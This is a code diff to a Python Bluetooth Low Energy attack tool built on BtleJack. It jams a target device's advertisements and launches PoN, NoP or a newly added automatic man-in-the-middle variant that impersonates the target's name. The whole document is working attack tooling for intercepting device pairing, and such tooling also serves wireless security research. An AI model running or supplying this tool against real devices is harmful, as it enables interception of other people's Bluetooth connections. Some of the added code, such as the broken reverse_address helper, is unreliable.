@@ -6,8 +6,9 @@
 
 BTLEJACK_SOURCE_PATH = "btlejack/"
 DISCOVERY_BINARY = "discovery/discovery"
-NOP_BINARY_PATH = "numeric_entry/numeric_entry"
-PON_BINARY_PATH = "numeric_entry_reverse/numeric_entry_reverse"
+NOP_BINARY_PATH = "NoP/nop.bin"
+PON_BINARY_PATH = "PoN/pon.bin"
+AUTO_BINARY_PATH = "full_mitm/full_mitm.bin"
 SCAN_TIMEOUT_SECONDS = 7
 SLEEP_TIME_BETWEEN_PACKET_PROCESSING = 0.01
 PATTERN_POSITION_MAC = 2
@@ -74,9 +75,11 @@ question_attack_variant = [
         'name': 'var',
         'message': 'Which attack variant shall be performed?',
         'choices': [
+        'auto',
         'None',
         'PoN',
-        'NoP']
+        'NoP'
+        ]
     }]
 
 # Globals
@@ -98,7 +101,7 @@ def is_valid_mac(arg_value, pat=re.compile(r"[0-9a-f]{2}:([0-9a-f]{2}:){4}[0-9a-
 def is_attack_type(arg_value):
     """ Checks if arg_value is either string 'pon' or 'nop' (casinsensitive) and returns True for NoP, None for no attack"""
     arg_value = arg_value.lower()
-    if arg_value != 'pon' and arg_value != 'nop' and arg_value != 'none':
+    if arg_value not in ['auto', 'pon', 'nop', 'none']:
         raise argparse.ArgumentTypeError
     return arg_value
 
@@ -109,24 +112,24 @@ def remove_by_pattern(l, pattern):
             del l[e]
             return
 
-def signal_handler(sig, frame):
-    print('Received SIGINT -> Shutting down gracefuly!')
-    if(jammer is not None):
-        print("\tDisabling jamming")
-        jammer_mutex.acquire()
-        jammer.disable_adv_jamming()
-        jammer_mutex.release()
-
-        while(True):
-            jammer_mutex.acquire()
-            if(jammer.interface.is_idle()):
-                break
-            jammer_mutex.release()
-            time.sleep(0.05)
-
-    # jamming_packet_processing will be killed by _exit(0)
-    print("Bye")
-    os._exit(0)
+#def signal_handler(sig, frame):
+#    print('Received SIGINT -> Shutting down gracefuly!')
+#    if(jammer is not None):
+#        print("\tDisabling jamming")
+#        jammer_mutex.acquire()
+#        jammer.disable_adv_jamming()
+#        jammer_mutex.release()
+#
+#        while(True):
+#            jammer_mutex.acquire()
+#            if(jammer.interface.is_idle()):
+#                break
+#            jammer_mutex.release()
+#            time.sleep(0.05)
+#
+#    # jamming_packet_processing will be killed by _exit(0)
+#    print("Bye")
+#    os._exit(0)
 
 class PatternMatcher:
     def __init__(self, pattern=None):
@@ -142,10 +145,8 @@ class PatternMatcher:
         if pos != -1:
             pattern_position = pos - 10
             sniffing = False
-            sniffer.disable_adv_sniffing()
-
             print(packet)
-            current_target_addr = packet[12:18].hex()
+            current_target_addr = ':'.join(["%02x" % i for i in reversed(packet[12:18])])
             print(current_target_addr)
 
 def main():
@@ -158,17 +159,17 @@ def main():
 
     parser = argparse.ArgumentParser(description='Method Confusion BLE attack tool.')
     parser.add_argument('-i', '--initiator', dest='init_dev_num', type=int, default=None, help='lsusb number of MitM initiator device')
-    parser.add_argument('-r', '--responder', dest='resp_dev_num', type=int, default=None, help='lsusb number of MitM initiator device')
-    parser.add_argument('-t', '--target-mac', dest='target_mac', type=is_valid_mac, default=None, help='MAC address of the target (if not provided BLE scanning will be initiated)')
-    parser.add_argument('-j', '--jamming-pattern', dest='target_pattern', type=str, default=None, help='Target\'s pattern to scan for (for a faster attack initiation)')
-    parser.add_argument('-p', '--pattern-position', dest='pattern_position', type=int, default=None, help='Target\'s pattern position in advertisement packet')
-    parser.add_argument('-a', '--attack-variant', dest='attack_variant', type=is_attack_type, default=None, help='Variant of attack (\'PoN\' or \'NoP\', \'None\' - just jamming\')')
-    parser.add_argument('-n', '--overshadow-name', dest='overshadow_name', type=str, default=None, help='If provided the name the MitM advertises (otherwise the overshadow targets name)')
-    parser.add_argument('-f', '--force-address', dest='force_addr', type=bool, default=False, help='use pattern for address resolution only')
+    parser.add_argument('-r', '--responder', dest='resp_dev_num', type=int, default=None, help='lsusb number of MitM responder device')
+    parser.add_argument('-m', '--target-mac', dest='target_mac', type=is_valid_mac, default=None, help='MAC address of the target (if no target mac and no target pattern is provided BLE scanning will be initiated)')
+    parser.add_argument('-p', '--target-pattern', dest='target_pattern', type=str, default=None, help='Target\'s pattern in advertisement packet to scan for (if no target mac and no target pattern is provided BLE scanning will be initiated)')
+    parser.add_argument('-o', '--pattern-offset', dest='pattern_position', type=int, default=None, help='Target\'s pattern position in advertisement packet')
+    parser.add_argument('-a', '--attack-variant', dest='attack_variant', type=is_attack_type, default=None, help='Variant of attack (\'auto\', \'PoN\' or \'NoP\', \'None\' - just jamming\')')
+    parser.add_argument('-n', '--display-name', dest='overshadow_name', type=str, default=None, help='The name the MitM advertises itself (if not provided, the target name is used)')
+    parser.add_argument('-x', '--optimized', dest='optimized_jamming', type=bool, default=False, help='Use address as target for jamming (WARNING: If victim responder has *LE PRIVACY* enabled, this *prevents* following the address change)')
 
     args = parser.parse_args()
-    signal.signal(signal.SIGINT, signal_handler)
-    signal.signal(signal.SIGTERM, signal_handler)
+    #signal.signal(signal.SIGINT, signal_handler)
+    #signal.signal(signal.SIGTERM, signal_handler)
 
     if(args.init_dev_num is None or args.resp_dev_num is None):
         process = subprocess.Popen(['lsusb'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -216,23 +217,21 @@ def main():
             exit(-1)
         sniffing_packet_processing()
         args.pattern_position = pattern_position
-        args.target_mac = current_target_addr
 
-    if(args.force_addr):
+    if(args.optimized_jamming):
         args.pattern_position = PATTERN_POSITION_MAC
         args.target_pattern = bytes.fromhex(current_target_addr)
 
+    if(args.overshadow_name is None):
+        #TODO change position in adv packet
+        args.overshadow_name = " " + args.target_pattern
 
-    if(len(args.overshadow_name) == 0):
-        print("Error: No overshadow name determined")
-        exit(0)
-
-    current_target_addr = args.target_mac
-    print("Jamming all advertisements of {current_target_addr} {target_name}")
+    print(f"Jamming all advertisements of {current_target_addr}")
     time.sleep(1)
 
     # Start jammer
     try:
+        print(f"jamming {args.target_pattern} at {args.pattern_position}")
         jammer = CLIAdvertisementsJammer(verbose=False, pattern=args.target_pattern, position=args.pattern_position)
     except DeviceError as error:
         print('Error: Please connect a compatible Micro:Bit in order to use BtleJack for jamming')
@@ -245,35 +244,35 @@ def main():
     if(args.attack_variant == 'none'):
         while(True):
             time.sleep(1)
-
-    if(args.attack_variant == 'nop'):
+    elif args.attack_variant == 'auto':
+        print("starting auto")
+        attack_process = subprocess.Popen([AUTO_BINARY_PATH, str(args.init_dev_num), str(args.resp_dev_num), args.overshadow_name, current_target_addr], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
+    elif args.attack_variant == 'nop':
         attack_process = subprocess.Popen([NOP_BINARY_PATH, str(args.init_dev_num), str(args.resp_dev_num), args.overshadow_name], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
-    elif(args.attack_variant == 'pon'):
+    elif args.attack_variant == 'pon':
         attack_process = subprocess.Popen([PON_BINARY_PATH, str(args.init_dev_num), str(args.resp_dev_num), args.overshadow_name], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
     else:
         print("invalid attack_variant \"" + args.attack_variant + "\"")
 
     while True:
-        # result = attack_process.stderr.readline()
         result = attack_process.stdout.readline()
 
+        if len(result) < 1:
+            continue
         print(result)
-        if(b"Please provide" in result):
+
+        if(b"RESP: Connection complete" in result):
             print("Target has connected to MitM responder -> Stop jamming")
             jammer_mutex.acquire()
             jammer.disable_adv_jamming()
             jammer_mutex.release()
 
-            print("Starting MitM-Responder")
-            # No race-condition expected as watchdog has been terminated
-            attack_process.stdin.write(current_target_addr.encode() + b"\n")
-            attack_process.stdin.flush()
 
-        return_code = attack_process.poll()
-        if return_code is not None:
-            print("Warning: watchdog died :(")
-            break
-
+def reverse_address(addr):
+    result = addr.reverse()
+    for i in range(6):
+        result += str(addr[-(2 * (i + 1)) : -(2 * i)]) + ":"
+    return result[:-1]
 
 def sniffing_packet_processing():
 
@@ -284,8 +283,9 @@ def sniffing_packet_processing():
         sniffer_mutex.acquire()
         sniffer.process_packets()
         sniffer_mutex.release()
-        #time.sleep(SLEEP_TIME_BETWEEN_PACKET_PROCESSING)
+        time.sleep(SLEEP_TIME_BETWEEN_PACKET_PROCESSING)
 
+    sniffer.disable_adv_sniffing()
 
 def jamming_packet_processing():
 
